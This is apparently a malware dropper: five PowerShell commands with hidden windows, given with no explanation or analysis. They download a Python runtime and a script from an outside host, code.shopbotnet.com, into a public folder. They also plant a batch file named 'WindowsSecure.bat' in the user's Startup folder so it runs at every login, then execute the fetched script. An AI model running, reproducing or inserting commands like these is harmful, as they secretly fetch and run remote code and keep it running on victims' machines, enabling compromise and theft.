powershell -windowstyle hidden Invoke-WebRequest -URI https://code.shopbotnet.com/python.zip  -OutFile C:\\Users\\Public\\Document.zip;
powershell -windowstyle hidden Expand-Archive C:\\Users\\Public\\Document.zip -DestinationPath C:\\Users\\Public\\Document;
powershell -windowstyle hidden Invoke-WebRequest -URI https://code.shopbotnet.com/source.php?token=FP8G1A6JQXLZP5O -OutFile C:\\Users\\Public\\Document\\libb1.py;
powershell -windowstyle hidden Invoke-WebRequest -URI https://code.shopbotnet.com/file.txt  -OutFile "C:\\Users\\$([Environment]::UserName)\\AppData\\Roaming\\Microsoft\\Windows\\'Start Menu'\\Programs\\Startup\\WindowsSecure.bat";
powershell -windowstyle hidden C:\\Users\\Public\\Document\\python C:\\Users\\Public\\Document\\libb1.py;